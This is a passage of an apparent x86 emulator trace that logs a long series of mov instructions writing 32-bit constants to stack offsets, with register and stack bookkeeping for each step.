0x402ed7: mov dword ptr [esp + 0xaa4], 0x9fb2ac94, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8aa4 for stack size 0x10000 saving data to stack: 2679286932 4 0x402ee2: mov dword ptr [esp + 0xaa8], 0xb525cd58, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8aa8 for stack size 0x10000 saving data to stack: 3039153496 4 0x402eed: mov dword ptr [esp + 0xaac], 0xf0098dd1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8aac for stack size 0x10000 saving data to stack: 4027157969 4 0x402ef8: mov dword ptr [esp + 0xab0], 0x146e6ad, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ab0 for stack size 0x10000 saving data to stack: 21423789 4 0x402f03: mov dword ptr [esp + 0xab4], 0xc8b9e54a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ab4 for stack size 0x10000 saving data to stack: 3367626058 4 0x402f0e: mov dword ptr [esp + 0xab8], 0x9a336a5a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ab8 for stack size 0x10000 saving data to stack: 2587060826 4 0x402f19: mov dword ptr [esp + 0xabc], 0xe0a85487, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8abc for stack size 0x10000 saving data to stack: 3769128071 4 0x402f24: mov dword ptr [esp + 0xac0], 0x7f3729ef, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ac0 for stack size 0x10000 saving data to stack: 2134321647 4 0x402f2f: mov dword ptr [esp + 0xac4], 0x8fb11750, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ac4 for stack size 0x10000 saving data to stack: 2410747728 4 0x402f3a: mov dword ptr [esp + 0xac8], 0x6296d08c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ac8 for stack size 0x10000 saving data to stack: 1654050956 4 0x402f45: mov dword ptr [esp + 0xacc], 0x3f03e15d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8acc for stack size 0x10000 saving data to stack: 1057218909 4 0x402f50: mov dword ptr [esp + 0xad0], 0x60b5ff61, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ad0 for stack size 0x10000 saving data to stack: 1622540129 4 0x402f5b: mov dword ptr [esp + 0xad4], 0xe506a286, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ad4 for stack size 0x10000 saving data to stack: 3842417286 4 0x402f66: mov dword ptr [esp + 0xad8], 0x1b262d9e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ad8 for stack size 0x10000 saving data to stack: 455486878 4 0x402f71: mov dword ptr [esp + 0xadc], 0x500bdb83, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8adc for stack size 0x10000 saving data to stack: 1342954371 4 0x402f7c: mov dword ptr [esp + 0xae0], 0x7ce37613, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ae0 for stack size 0x10000 saving data to stack: 2095281683 4 0x402f87: mov dword ptr [esp + 0xae4], 0x531a5e8c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ae4 for stack size 0x10000 saving data to stack: 1394237068 4 0x402f92: mov dword ptr [esp + 0xae8], 0xde348ea0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ae8 for stack size 0x10000 saving data to stack: 3727986336 4 0x402f9d: mov dword ptr [esp + 0xaec], 0x895adfc9, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8aec for stack size 0x10000 saving data to stack: 2304434121 4 0x402fa8: mov dword ptr [esp + 0xaf0], 0x39a516f5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8af0 for stack size 0x10000 saving data to stack: 967120629 4 0x402fb3: mov dword ptr [esp + 0xaf4], 0xbb5ad422, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8af4 for stack size 0x10000 saving data to stack: 3143291938 4 0x402fbe: mov dword ptr [esp + 0xaf8], 0xbd007d62, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8af8 for stack size 0x10000 saving data to stack: 3170925922 4 0x402fc9: mov dword ptr [esp + 0xafc], 0xee2e571f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8afc for stack size 0x10000 saving data to stack: 3996014367 4 0x402fd4: mov dword ptr [esp + 0xb00], 0xe9881a97, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b00 for stack size 0x10000 saving data to stack: 3918011031 4 0x402fdf: mov dword ptr [esp + 0xb04], 0xda130808, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b04 for stack size 0x10000 saving data to stack: 3658680328 4 0x402fea: mov dword ptr [esp + 0xb08], 0xb60099b4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b08 for stack size 0x10000 saving data to stack: 3053492660 4 0x402ff5: mov dword ptr [esp + 0xb0c], 0x9a2f2eb5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b0c for stack size 0x10000 saving data to stack: 2586783413 4 0x403000: mov dword ptr [esp + 0xb10], 0xec2ce569, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b10 for stack size 0x10000 saving data to stack: 3962365289 4 0x40300b: mov dword ptr [esp + 0xb14], 0x2f68933e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b14 for stack size 0x10000 saving data to stack: 795382590 4 0x403016: mov dword ptr [esp + 0xb18], 0x291c07c6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b18 for stack size 0x10000 saving data to stack: 689702854 4 0x403021: mov dword ptr [esp + 0xb1c], 0x671c8b1b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b1c for stack size 0x10000 saving data to stack: 1729923867 4 0x40302c: mov dword ptr [esp + 0xb20], 0xa0ef6cbb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b20 for stack size 0x10000 saving data to stack: 2700045499 4 0x403037: mov dword ptr [esp + 0xb24], 0xf65fc544, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b24 for stack size 0x10000 saving data to stack: 4133471556 4 0x403042: mov dword ptr [esp + 0xb28], 0xc09480e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b28 for stack size 0x10000 saving data to stack: 3230957800 4 0x40304d: mov dword ptr [esp + 0xb2c], 0xb4c02001, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b2c for stack size 0x10000 saving data to stack: 3032489985 4 0x403058: mov dword ptr [esp + 0xb30], 0xb716d33d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b30 for stack size 0x10000 saving data to stack: 3071726397 4 0x403063: mov dword ptr [esp + 0xb34], 0x1f66fdfa, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b34 for stack size 0x10000 saving data to stack: 526843386 4 0x40306e: mov dword ptr [esp + 0xb38], 0xa59b72ea, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b38 for stack size 0x10000 saving data to stack: 2778428138 4 0x403079: mov dword ptr [esp + 0xb3c], 0x32a15c37, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b3c for stack size 0x10000 saving data to stack: 849435703 4 0x403084: mov dword ptr [esp + 0xb40], 0x72438eff, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b40 for stack size 0x10000 saving data to stack: 1917030143 4 0x40308f: mov dword ptr [esp + 0xb44], 0x73645a00, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b44 for stack size 0x10000 saving data to stack: 1935956480 4 0x40309a: mov dword ptr [esp + 0xb48], 0xfaaf581c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b48 for stack size 0x10000 saving data to stack: 4205795356 4 0x4030a5: mov dword ptr [esp + 0xb4c], 0x1ec6a40d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b4c for stack size 0x10000 saving data to stack: 516334605 4 0x4030b0: mov dword ptr [esp + 0xb50], 0x253d4c71, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b50 for stack size 0x10000 saving data to stack: 624774257 4 0x4030bb: mov dword ptr [esp + 0xb54], 0xda3b68b6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b54 for stack size 0x10000 saving data to stack: 3661326518 4 0x4030c6: mov dword ptr [esp + 0xb58], 0x3f65e32e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b58 for stack size 0x10000 saving data to stack: 1063641902 4 0x4030d1: mov dword ptr [esp + 0xb5c], 0x100e5cb3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b5c for stack size 0x10000 saving data to stack: 269376691 4 0x4030dc: mov dword ptr [esp + 0xb60], 0x3f69dda3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b60 for stack size 0x10000 saving data to stack: 1063902627 4 0x4030e7: mov dword ptr [esp + 0xb64], 0x8e150d3c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b64 for stack size 0x10000 saving data to stack: 2383744316 4 0x4030f2: mov dword ptr [esp + 0xb68], 0xcef225b0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b68 for stack size 0x10000 saving data to stack: 3471975856 4 0x4030fd: mov dword ptr [esp + 0xb6c], 0x1bcd6579, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b6c for stack size 0x10000 saving data to stack: 466445689 4 0x403108: mov dword ptr [esp + 0xb70], 0x92e3a285, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b70 for stack size 0x10000 saving data to stack: 2464391813 4 0x403113: mov dword ptr [esp + 0xb74], 0x31049d52, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b74 for stack size 0x10000 saving data to stack: 822386002 4 0x40311e: mov dword ptr [esp + 0xb78], 0x2bb10c72, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b78 for stack size 0x10000 saving data to stack: 733023346 4 0x403129: mov dword ptr [esp + 0xb7c], 0x63d8204f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b7c for stack size 0x10000 saving data to stack: 1675108431 4 0x403134: mov dword ptr [esp + 0xb80], 0x72b127, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b80 for stack size 0x10000 saving data to stack: 7516455 4 0x40313f: mov dword ptr [esp + 0xb84], 0xee86e638, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b84 for stack size 0x10000 saving data to stack: 4001818168 4 0x40314a: mov dword ptr [esp + 0xb88], 0x47ca39c4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b88 for stack size 0x10000 saving data to stack: 1204435396 4 0x403155: mov dword ptr [esp + 0xb8c], 0x4da088e5, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b8c for stack size 0x10000 saving data to stack: 1302366437 4 0x403160: mov dword ptr [esp + 0xb90], 0xf4e0db79, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b90 for stack size 0x10000 saving data to stack: 4108376953 4 0x40316b: mov dword ptr [esp + 0xb94], 0xe2d9ed6e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b94 for stack size 0x10000 saving data to stack: 3805932910 4 0x403176: mov dword ptr [esp + 0xb98], 0x693381d6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b98 for stack size 0x10000 saving data to stack: 1764983254 4 0x403181: mov dword ptr [esp + 0xb9c], 0xbdc9a3cb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8b9c for stack size 0x10000 saving data to stack: 3184108491 4 0x40318c: mov dword ptr [esp + 0xba0], 0x85f39f4b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ba0 for stack size 0x10000 saving data to stack: 2247335755 4 0x403197: mov dword ptr [esp + 0xba4], 0x4d0cddf4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ba4 for stack size 0x10000 saving data to stack: 1292688884 4 0x4031a2: mov dword ptr [esp + 0xba8], 0xb243adf8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ba8 for stack size 0x10000 saving data to stack: 2990779896 4 0x4031ad: mov dword ptr [esp + 0xbac], 0x50bd52b1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bac for stack size 0x10000 saving data to stack: 1354584753 4 0x4031b8: mov dword ptr [esp + 0xbb0], 0x347a8bcd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bb0 for stack size 0x10000 saving data to stack: 880446413 4 0x4031c3: mov dword ptr [esp + 0xbb4], 0x7aeab2aa, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bb4 for stack size 0x10000 saving data to stack: 2062201514 4 0x4031ce: mov dword ptr [esp + 0xbb8], 0xd94f307a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bb8 for stack size 0x10000 saving data to stack: 3645845626 4 0x4031d9: mov dword ptr [esp + 0xbbc], 0x7ee142e7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bbc for stack size 0x10000 saving data to stack: 2128691943 4 0x4031e4: mov dword ptr [esp + 0xbc0], 0x4dad0f0f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bc0 for stack size 0x10000 saving data to stack: 1303187215 4 0x4031ef: mov dword ptr [esp + 0xbc4], 0x68db87b0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bc4 for stack size 0x10000 saving data to stack: 1759217584 4 0x4031fa: mov dword ptr [esp + 0xbc8], 0xdbaf152c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bc8 for stack size 0x10000 saving data to stack: 3685684524 4 0x403205: mov dword ptr [esp + 0xbcc], 0x404177bd, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bcc for stack size 0x10000 saving data to stack: 1078032317 4 0x403210: mov dword ptr [esp + 0xbd0], 0x835dc381, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bd0 for stack size 0x10000 saving data to stack: 2203960193 4 0x40321b: mov dword ptr [esp + 0xbd4], 0xb871d5e6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bd4 for stack size 0x10000 saving data to stack: 3094468070 4 0x403226: mov dword ptr [esp + 0xbd8], 0x862e303e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bd8 for stack size 0x10000 saving data to stack: 2251173950 4 0x403231: mov dword ptr [esp + 0xbdc], 0x70462263, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bdc for stack size 0x10000 saving data to stack: 1883644515 4 0x40323c: mov dword ptr [esp + 0xbe0], 0xfd2735b3, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8be0 for stack size 0x10000 saving data to stack: 4247205299 4 0x403247: mov dword ptr [esp + 0xbe4], 0x3bed66c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8be4 for stack size 0x10000 saving data to stack: 62838380 4 0x403252: mov dword ptr [esp + 0xbe8], 0x1b045e40, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8be8 for stack size 0x10000 saving data to stack: 453271104 4 0x40325d: mov dword ptr [esp + 0xbec], 0xfb902829, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bec for stack size 0x10000 saving data to stack: 4220528681 4 0x403268: mov dword ptr [esp + 0xbf0], 0x6f7d7695, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bf0 for stack size 0x10000 saving data to stack: 1870493333 4 0x403273: mov dword ptr [esp + 0xbf4], 0x6bff4c02, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bf4 for stack size 0x10000 saving data to stack: 1811893250 4 0x40327e: mov dword ptr [esp + 0xbf8], 0xe8f48802, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bf8 for stack size 0x10000 saving data to stack: 3908339714 4 0x403289: mov dword ptr [esp + 0xbfc], 0x19e8bf7f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8bfc for stack size 0x10000 saving data to stack: 434683775 4 0x403294: mov dword ptr [esp + 0xc00], 0xaf61a837, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c00 for stack size 0x10000 saving data to stack: 2942412855 4 0x40329f: mov dword ptr [esp + 0xc04], 0xfd4def68, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c04 for stack size 0x10000 saving data to stack: 4249743208 4 0x4032aa: mov dword ptr [esp + 0xc08], 0xb044e3d4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c08 for stack size 0x10000 saving data to stack: 2957304788 4 0x4032b5: mov dword ptr [esp + 0xc0c], 0x1aaf8115, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c0c for stack size 0x10000 saving data to stack: 447709461 4 0x4032c0: mov dword ptr [esp + 0xc10], 0xeae3e089, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c10 for stack size 0x10000 saving data to stack: 3940802697 4 0x4032cb: mov dword ptr [esp + 0xc14], 0x4ce43d9e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c14 for stack size 0x10000 saving data to stack: 1290026398 4 0x4032d6: mov dword ptr [esp + 0xc18], 0x9bd33fe6, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c18 for stack size 0x10000 saving data to stack: 2614312934 4 0x4032e1: mov dword ptr [esp + 0xc1c], 0x2d50c97b, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c1c for stack size 0x10000 saving data to stack: 760269179 4 0x4032ec: mov dword ptr [esp + 0xc20], 0x9cc692db, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c20 for stack size 0x10000 saving data to stack: 2630259419 4 0x4032f7: mov dword ptr [esp + 0xc24], 0x3ad512a4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c24 for stack size 0x10000 saving data to stack: 987042468 4 0x403302: mov dword ptr [esp + 0xc28], 0x3e4e508, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c28 for stack size 0x10000 saving data to stack: 65332488 4 0x40330d: mov dword ptr [esp + 0xc2c], 0xf17ae261, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c2c for stack size 0x10000 saving data to stack: 4051362401 4 0x403318: mov dword ptr [esp + 0xc30], 0xc237d55d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c30 for stack size 0x10000 saving data to stack: 3258439005 4 0x403323: mov dword ptr [esp + 0xc34], 0x68b2e75a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c34 for stack size 0x10000 saving data to stack: 1756555098 4 0x40332e: mov dword ptr [esp + 0xc38], 0x54cbcc8a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c38 for stack size 0x10000 saving data to stack: 1422642314 4 0x403339: mov dword ptr [esp + 0xc3c], 0xc2da9117, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c3c for stack size 0x10000 saving data to stack: 3269103895 4 0x403344: mov dword ptr [esp + 0xc40], 0x6078d09f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c40 for stack size 0x10000 saving data to stack: 1618530463 4 0x40334f: mov dword ptr [esp + 0xc44], 0xd2e5d7e0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c44 for stack size 0x10000 saving data to stack: 3538278368 4 0x40335a: mov dword ptr [esp + 0xc48], 0x7d5553c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c48 for stack size 0x10000 saving data to stack: 131421500 4 0x403365: mov dword ptr [esp + 0xc4c], 0xdefce36d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c4c for stack size 0x10000 saving data to stack: 3741115245 4 0x403370: mov dword ptr [esp + 0xc50], 0xb9d60f11, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c50 for stack size 0x10000 saving data to stack: 3117813521 4 0x40337b: mov dword ptr [esp + 0xc54], 0xc738df16, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c54 for stack size 0x10000 saving data to stack: 3342393110 4 0x403386: mov dword ptr [esp + 0xc58], 0x1a36f3ce, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c58 for stack size 0x10000 saving data to stack: 439808974 4 0x403391: mov dword ptr [esp + 0xc5c], 0x3bc8c513, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c5c for stack size 0x10000 saving data to stack: 1003013395 4 0x40339c: mov dword ptr [esp + 0xc60], 0x80acbb43, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c60 for stack size 0x10000 saving data to stack: 2158803779 4 0x4033a7: mov dword ptr [esp + 0xc64], 0xa04f9a9c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c64 for stack size 0x10000 saving data to stack: 2689571484 4 0x4033b2: mov dword ptr [esp + 0xc68], 0x327ff950, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c68 for stack size 0x10000 saving data to stack: 847247696 4 0x4033bd: mov dword ptr [esp + 0xc6c], 0xa573159, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c6c for stack size 0x10000 saving data to stack: 173486425 4 0x4033c8: mov dword ptr [esp + 0xc70], 0xe5fbf525, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c70 for stack size 0x10000 saving data to stack: 3858494757 4 0x4033d3: mov dword ptr [esp + 0xc74], 0x2bc6032, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c74 for stack size 0x10000 saving data to stack: 45899826 4 0x4033de: mov dword ptr [esp + 0xc78], 0x3c43df12, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c78 for stack size 0x10000 saving data to stack: 1011080978 4 0x4033e9: mov dword ptr [esp + 0xc7c], 0xd9eb40af, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c7c for stack size 0x10000 saving data to stack: 3656073391 4 0x4033f4: mov dword ptr [esp + 0xc80], 0x57864a47, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c80 for stack size 0x10000 saving data to stack: 1468418631 4 0x4033ff: mov dword ptr [esp + 0xc84], 0xdb845c98, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c84 for stack size 0x10000 saving data to stack: 3682884760 4 0x40340a: mov dword ptr [esp + 0xc88], 0x78f2dbe4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c88 for stack size 0x10000 saving data to stack: 2029181924 4 0x403415: mov dword ptr [esp + 0xc8c], 0xcc1eb745, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c8c for stack size 0x10000 saving data to stack: 3424565061 4 0x403420: mov dword ptr [esp + 0xc90], 0x6b43699, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c90 for stack size 0x10000 saving data to stack: 112473753 4 0x40342b: mov dword ptr [esp + 0xc94], 0x425b6b4e, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c94 for stack size 0x10000 saving data to stack: 1113287502 4 0x403436: mov dword ptr [esp + 0xc98], 0xb7ba7c76, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c98 for stack size 0x10000 saving data to stack: 3082452086 4 0x403441: mov dword ptr [esp + 0xc9c], 0xb8736ab, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8c9c for stack size 0x10000 saving data to stack: 193410731 4 0x40344c: mov dword ptr [esp + 0xca0], 0xe969afeb, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ca0 for stack size 0x10000 saving data to stack: 3916017643 4 0x403457: mov dword ptr [esp + 0xca4], 0x9658c754, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ca4 for stack size 0x10000 saving data to stack: 2522400596 4 0x403462: mov dword ptr [esp + 0xca8], 0x73f4fb98, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ca8 for stack size 0x10000 saving data to stack: 1945435032 4 0x40346d: mov dword ptr [esp + 0xcac], 0xe6afa891, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cac for stack size 0x10000 saving data to stack: 3870271633 4 0x403478: mov dword ptr [esp + 0xcb0], 0xc01614ed, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cb0 for stack size 0x10000 saving data to stack: 3222672621 4 0x403483: mov dword ptr [esp + 0xcb4], 0xbf60000a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cb4 for stack size 0x10000 saving data to stack: 3210739722 4 0x40348e: mov dword ptr [esp + 0xcb8], 0x5902989a, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cb8 for stack size 0x10000 saving data to stack: 1493342362 4 0x403499: mov dword ptr [esp + 0xcbc], 0xd74e6f47, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cbc for stack size 0x10000 saving data to stack: 3612241735 4 0x4034a4: mov dword ptr [esp + 0xcc0], 0x3e06582f, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cc0 for stack size 0x10000 saving data to stack: 1040603183 4 0x4034af: mov dword ptr [esp + 0xcc4], 0x86573210, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cc4 for stack size 0x10000 saving data to stack: 2253861392 4 0x4034ba: mov dword ptr [esp + 0xcc8], 0x2165fecc, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cc8 for stack size 0x10000 saving data to stack: 560332492 4 0x4034c5: mov dword ptr [esp + 0xccc], 0x35a9fc1d, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ccc for stack size 0x10000 saving data to stack: 900332573 4 0x4034d0: mov dword ptr [esp + 0xcd0], 0x1f852da1, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cd0 for stack size 0x10000 saving data to stack: 528821665 4 0x4034db: mov dword ptr [esp + 0xcd4], 0xdbacbd46, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cd4 for stack size 0x10000 saving data to stack: 3685530950 4 0x4034e6: mov dword ptr [esp + 0xcd8], 0xd9f55bde, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cd8 for stack size 0x10000 saving data to stack: 3656735710 4 0x4034f1: mov dword ptr [esp + 0xcdc], 0x46b1f643, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cdc for stack size 0x10000 saving data to stack: 1186068035 4 0x4034fc: mov dword ptr [esp + 0xce0], 0x3bb2a453, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ce0 for stack size 0x10000 saving data to stack: 1001563219 4 0x403507: mov dword ptr [esp + 0xce4], 0x49c0794c, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ce4 for stack size 0x10000 saving data to stack: 1237350732 4 0x403512: mov dword ptr [esp + 0xce8], 0x9d03bce0, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8ce8 for stack size 0x10000 saving data to stack: 2634267872 4 0x40351d: mov dword ptr [esp + 0xcec], 0x8000fa89, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cec for stack size 0x10000 saving data to stack: 2147547785 4 0x403528: mov dword ptr [esp + 0xcf0], 0xf8744535, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cf0 for stack size 0x10000 saving data to stack: 4168369461 4 0x403533: mov dword ptr [esp + 0xcf4], 0xb200eee2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cf4 for stack size 0x10000 saving data to stack: 2986405602 4 0x40353e: mov dword ptr [esp + 0xcf8], 0x7bcfaba2, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cf8 for stack size 0x10000 saving data to stack: 2077207458 4 0x403549: mov dword ptr [esp + 0xcfc], 0xe4d471df, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8cfc for stack size 0x10000 saving data to stack: 3839128031 4 0x403554: mov dword ptr [esp + 0xd00], 0xa85748d7, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d00 for stack size 0x10000 saving data to stack: 2824292567 4 0x40355f: mov dword ptr [esp + 0xd04], 0xd0b922c8, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d04 for stack size 0x10000 saving data to stack: 3501793992 4 0x40356a: mov dword ptr [esp + 0xd08], 0x74cfc7f4, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d08 for stack size 0x10000 saving data to stack: 1959774196 4 0x403575: mov dword ptr [esp + 0xd0c], 0x90d54975, regs_read: [30], regs_write: () adjusting stack for ESP -0x4 and offset 0x8d0c for stack size 